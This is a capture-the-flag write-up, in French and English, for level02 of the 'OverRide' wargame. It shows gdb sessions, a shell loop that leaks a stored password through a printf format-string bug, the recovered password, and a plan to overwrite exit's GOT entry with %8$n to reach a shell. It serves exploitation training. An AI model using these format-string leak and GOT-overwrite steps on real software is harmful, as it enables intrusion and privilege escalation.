@@ -1,0 +1,118 @@
+*- Solution 1 -* 
+
+Pour pouvoir débugguer dans gdb
+b main
+r
+set {char [26]} 0x400bb2 = "/home/users/level02/.pass"
+c
+
+for i in {0..50}; do printf "%d - %%%d\$lp\nABCDEFGH" "$i" "$i" | ./level02 | grep does; done
+
+notice :
+    8 - 4847464544434241 does not have access!
+
+the value of B is displayed in reverse because of little endian
+
+level02@OverRide:~$ lscpu | grep Endian
+Byte Order:            Little Endian
+
+We also notice that between lines 22 and 26 seems to be a strings of 8 characters
+
+5 strings of 8 = 40 characters, with an additionnal \0|n it could be our flag.
+
+    22 - 0x756e505234376848 does not have access!
+    23 - 0x45414a3561733951 does not have access!
+    24 - 0x377a7143574e6758 does not have access!
+    25 - 0x354a35686e475873 does not have access!
+    26 - 0x48336750664b394d does not have access!
+
+reversed and convert to strings we got those strings :
+    Hh74RPnu
+    Q9sa5JAE
+    XgNWCqz7
+    sXGnh5J5
+    M9KfPg3H
+
+Concatenate we get : 
+    Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+
+Possibility to reproduce with scripts get_raw.sh and translate.python
+
+level02@OverRide:~$ bash get_crypted.sh | python exploit.py
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+
+level02@OverRide:~$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: l
+--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+*****************************************
+Greetings, l!
+$ whoami
+level03
+$
+
+*- Solution 2 -* 
+
+On va overwrite l'adresse de exit dans la global offset table avec celle de main + 600 
+pour retourner en arriére dans l'execution du programme et 
+rentrer dans le if qui lance un bin/sh
+
+1 - On cherche l'addresse où est stocker l'addresse de exit -
+
+Disas main...
+   0x0000000000400ab6 <+674>:	call   0x400710 <exit@plt>
+End of assembler dump.
+
+=> 0x400710
+
+(gdb) x/3i 0x400710
+   0x400710 <exit@plt>:	jmp    QWORD PTR [rip+0x200b12]        # 0x601228 <exit@got.plt>
+   0x400716 <exit@plt+6>:	push   0xa
+   0x40071b <exit@plt+11>:	jmp    0x400660
+
+(gdb) x/gx 0x601228
+0x601228 <exit@got.plt>:	0x0000000000400716
+
+=> On a l'adresse de exit dans la got 0x601228
+
+
+2 - On cherche l'adresse où se positionner avec l'exploit -
+(gdb) disas main
+	...
+	0x0000000000400a6c <+600>:	mov    eax,0x400d22
+
+(gdb) x/s 0x400d22
+0x400d22:	 "Greetings, %s!\n"
+
+=> Il faut revenir ici 0x0000000000400a6c
+
+
+3 - Construire l'exploit -
+
+ - En testant les inputs du programme on peut voir que à la fin il y un printf exploitable
+	qui va print l'input 'user_name' 
+ 
+ - Maintenant si on entre des %x ou %p on peut afficher la mémoire et on voit que 
+ 	l'input password est afficher sur le 8ème formateur %8$s
+ 
+ - On peut donc écrire sur la mémoire avec un %8$n
+ 
+ - On doit écrire l'adresse de main + 600 (0x400a6c) sur celle de exit
+ 
+ - Attention quand on met l'adresse où est stocker exit en premier on a un nul byte 
+ 	au mileu de notre payload ce qui coupe l'execution de printf on doit donc l'écrire à la fin
+
+ - Pour pouvoir remplir des 2 input avec python on doit les séparer par un '\n'
+
+ - La payload ressemblera donc à ça: 
+ 									user_name = {
+ 								    	1. formateur avec une marge permettant d'ecrire 0x400a6c (4196972) bytes au total (4196971)
+										2. %8$n
+ 									}
+									3. '\n'
+									password {
+										4. Adresse où est stocker exit 0x601228
+									}
